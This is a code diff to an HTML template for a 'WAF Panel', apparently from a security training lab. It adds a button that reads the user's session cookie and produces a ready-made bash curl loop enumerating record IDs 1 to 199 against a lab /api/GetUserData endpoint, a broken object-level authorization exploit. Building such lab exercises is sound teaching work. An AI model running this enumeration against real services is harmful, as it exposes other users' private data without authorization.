@@ -4,7 +4,7 @@ content %}
 <!-- Main content -->
 <h1>WAF Panel</h1>
 
-<!-- GetGetSession Section -->
+
 <p>
   <b>Get Origin Headers</b><br />
   This function returns the origin server headers. To interpret the client
@@ -18,8 +18,27 @@ content %}
 </p>
 <button id="GetHeadersButton">Get Headers from the Origin Server</button>
 <div id="GetHeadersResult" class="result"></div>
+<br />
+
+<p>
+  <b>Generate BOLA command</b><br />
+  Click "Cenerate BOLA command" to generate ready to go BOLA exploitation command for bash. 
+</p>
+<button id="GenerateBOLAButton">Generate BOLA</button>
+<div id="GenerateBOLAResult" class="result"></div>
+<br />
+
 
 <script>
+  function getCookie(name) {
+    const cookies = document.cookie.split("; ");
+    for (let c of cookies) {
+      const [key, value] = c.split("=");
+      if (key === name) return decodeURIComponent(value);
+    }
+    return null; // cookie not found
+  }
+
   document.getElementById("GetHeadersButton").onclick = () => {
     fetch("/api/GetHeaders")
       .then((res) => res.json())
@@ -29,6 +48,20 @@ content %}
           lines.join("\n");
         //document.getElementById('GetHeadersResult').innerText = JSON.stringify(data);
       });
+  };
+
+  document.getElementById("GenerateBOLAButton").onclick = () => {
+    fetch("/api/GetSession")
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.username) {
+            document.getElementById("GenerateBOLAResult").textContent =
+             'n=1; while [[ $n -lt 200 ]]; do echo "===Got record ID: $n"; curl --location --request POST "http://lab.spm.pl/api/GetUserData" --header "Accept: application/json" --header "Content-Type: application/json" -b "session=' + getCookie("session") + '" --data-raw "{\\\"id\\\":\\\"$n\\\"}" -s; echo ""; echo ""; n=$((n+1)); done'
+          } else {
+            document.getElementById("GenerateBOLAResult").textContent =
+              "nie ma sesji";
+          }
+        });
   };
 </script>
 
